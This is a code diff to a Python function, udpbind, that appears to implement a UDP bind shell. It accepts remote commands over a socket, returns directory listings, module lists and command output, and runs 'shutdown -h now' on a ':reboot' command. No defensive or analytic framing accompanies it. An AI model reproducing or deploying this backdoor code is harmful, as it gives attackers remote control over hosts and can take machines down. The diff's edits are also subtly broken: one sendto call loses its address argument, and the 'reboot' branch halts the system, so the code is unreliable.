@@ -50,17 +50,14 @@ def udpbind():
             (UDPSock.sendto("\nCurrent Directory: "+str(os.getcwd()), addr))
 
         elif data == ":mods":
-            (UDPSock.sendto("[+] Currently loaded modules:\n %s " % modList, addr))
+            (UDPSock.sendto("[+] Currently loaded modules:\n %s " % (modList, addr)))
 
         elif data.startswith(":exec"):
             pass   
 
-        elif cmd.startswith(":reboot"):
+        elif data.startswith(":reboot"):
             (UDPSock.sendto("[+] System going down for reboot!", addr))
             os.system("shutdown -h now")
-
-        elif cmd == (":mods"):
-            (UDPSock.sendto("[+] Current available modules: %s" % str(modList)), addr))            
 
         elif proc:
             (UDPSock.sendto(stdout,addr))
